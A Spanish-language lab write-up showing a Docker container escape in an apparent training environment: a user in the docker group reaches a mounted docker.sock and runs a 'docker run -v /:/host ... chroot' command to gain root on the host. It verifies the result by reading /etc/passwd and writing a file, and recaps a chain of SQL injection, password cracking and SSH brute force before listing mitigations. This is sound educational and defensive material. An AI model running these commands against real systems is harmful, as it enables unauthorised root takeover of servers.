# 05 - Container Escape

## Objetivo

Demostrar como un contenedor mal configurado permite escapar al sistema
anfitrion (host) y obtener control total del servidor, partiendo de un
usuario sin privilegios.

---

## Punto de partida

Tras la fase de explotacion tenemos acceso SSH al servidor como `morty`:

```
uid=1002(morty) gid=1002(morty) groups=1002(morty),999(docker)
```

`morty` no es root, pero pertenece al grupo `docker`. Esto es suficiente
para comprometer el host completamente.

---

## Script utilizado

```bash
# Desde dentro del vuln-container
chmod +x scripts/escape.sh
./scripts/escape.sh
```

---

## Fase 1: Entrar al vuln-container

Desde la shell SSH de morty:

```bash
docker exec -it vuln-container bash
```

El prompt cambia a `root@<hash>:/#`. Somos root dentro del contenedor,
pero solo dentro del contenedor. El host sigue siendo inaccesible... por ahora.

---

## Fase 2: Reconocimiento dentro del contenedor

```bash
# Confirmar que estamos en un contenedor
ls /.dockerenv

# Ver el OS del contenedor (Ubuntu 22.04, no Debian)
cat /etc/os-release

# Ver IP interna en lab-net
hostname -I
# 172.18.0.2

# Detectar el vector de escape
ls -la /var/run/docker.sock
# srw-rw---- 1 root 996 0 May 28 16:08 /var/run/docker.sock
```

### Hallazgos

| Hallazgo | Significado |
|---|---|
| `/.dockerenv` existe | Confirmado entorno Docker |
| OS: Ubuntu 22.04 | Diferente al host (Debian 12) → contenedor aislado |
| IP: 172.18.0.2 | Red interna `lab-net` |
| `docker.sock` presente | **Vector de escape critico** |

### Como detectar que estas en un contenedor

```bash
# Test 1: archivo .dockerenv
ls /.dockerenv

# Test 2: cgroups revelan Docker
cat /proc/1/cgroup | grep docker

# Test 3: PID 1 es sleep infinity, no systemd
cat /proc/1/comm
```

---

## Fase 3: Acceso al daemon Docker del host

Instalar el cliente Docker dentro del contenedor:

```bash
apt update && apt install -y docker.io
```

Listar contenedores del HOST desde dentro del contenedor:

```bash
docker ps
```

Resultado:

```
CONTAINER ID   IMAGE                    STATUS    NAMES
e2d0ad1e9dc9   ubuntu:22.04             Up        vuln-container
059625fd0166   bkimminich/juice-shop    Up        juiceshop
```

Esto demuestra que el contenedor tiene acceso completo al daemon Docker
del host a traves del socket montado. Para Docker, el contenedor es
indistinguible de un cliente legitimo del sistema.

---

## Fase 4: El escape

### Comando

```bash
docker run -it --rm -v /:/host alpine chroot /host bash
```

### Explicacion detallada

| Parte | Significado |
|---|---|
| `docker run` | Pide al daemon Docker del HOST crear un nuevo contenedor |
| `-v /:/host` | Monta el `/` del HOST en `/host` del nuevo contenedor |
| `alpine` | Imagen minima (~5MB) para el nuevo contenedor |
| `chroot /host` | Cambia la raiz del sistema de archivos a `/host` |
| `bash` | Abre una shell en el nuevo entorno |

### Por que funciona

```
vuln-container
  │
  │  docker.sock montado
  │  (habla con el daemon del HOST)
  ▼
daemon Docker del HOST (corre como root)
  │
  │  crea nuevo contenedor alpine
  │  con -v /:/host
  ▼
nuevo contenedor alpine
  │
  │  /host/ = filesystem completo del HOST
  │
  │  chroot /host
  ▼
shell con raiz = HOST REAL
uid=0(root) 
```

El daemon Docker corre como root en el host y no implementa
autenticacion en el socket Unix. Cualquier proceso con acceso
al socket puede pedirle que monte el filesystem del host.

---

## Fase 5: Verificacion del compromiso

Una vez ejecutado el escape:

```bash
# Somos root en el HOST
id
# uid=0(root) gid=0(root) groups=0(root)

# El OS es Debian 12 (el host real, no Ubuntu del contenedor)
cat /etc/os-release
# PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"

# Usuarios reales del servidor
cat /etc/passwd | grep -v nologin
# root, user, labuser, morty

# Filesystem completo del host
ls /
# bin dev home boot etc var...

# Prueba de escritura en el host
echo "PWNED by container escape - $(date)" > /tmp/pwned.txt
cat /tmp/pwned.txt
# PWNED by container escape - Thu May 28 11:48:03 CDT 2026
```

Verificacion desde el servidor (fuera del contenedor):

```bash
morty@server:~$ cat /tmp/pwned.txt
PWNED by container escape - Thu May 28 11:48:03 CDT 2026
```

El archivo escrito desde dentro del contenedor existe en el host real.
Compromiso total demostrado.

---

## Resumen de misconfiguraciones explotadas

| Misconfiguración | Como se exploto |
|---|---|
| `docker.sock` montado | Comunicacion directa con el daemon Docker del host |
| `privileged: true` | Sin restricciones de kernel para montar filesystems |
| `cap_add: ALL` | Todas las capabilities disponibles para el escape |

Las tres misconfiguraciones juntas garantizan el escape. Cada una por
separado ya seria un hallazgo critico en una auditoria real.

---

## Impacto del compromiso

Con root en el host el atacante puede:

- Leer cualquier archivo del sistema (`/etc/shadow`, claves SSH...)
- Modificar configuraciones del servidor
- Crear usuarios backdoor persistentes
- Instalar rootkits o malware
- Pivotar a la red corporativa
- Comprometer otros servidores desde el host

---

## Cadena completa del ataque

```
Kali (atacante)
  |
  +-- [1] SQLi en Juice Shop -> 23 usuarios y hashes volcados
  |
  +-- [2] John the ripper -> morty:ncc-1701 crackeado
  |
  +-- [3] Hydra -> acceso SSH como morty (sin privilegios)
  |
  +-- [4] morty en grupo docker -> docker exec al vuln-container
  |
  +-- [5] docker.sock detectado dentro del contenedor
  |
  +-- [6] docker run -v /:/host alpine chroot /host bash
  |
  +-- [7] ROOT EN EL HOST 
            id -> uid=0(root) gid=0(root)
            cat /etc/os-release -> Debian GNU/Linux 12
```

---

## Mitigaciones (fase defensiva)

| Mitigacion | Como se implementa |
|---|---|
| No montar docker.sock | Eliminar el volumen del compose |
| No usar privileged | Eliminar `privileged: true` |
| Drop de capabilities | `cap_drop: ALL` + solo las necesarias |
| Usuario no root | `user: "1000:1000"` en el compose |
| Read only filesystem | `read_only: true` en el compose |
| No añadir usuarios al grupo docker | Usar sudo con comandos especificos |

Todas estas mitigaciones se implementan en la siguiente fase: hardening.
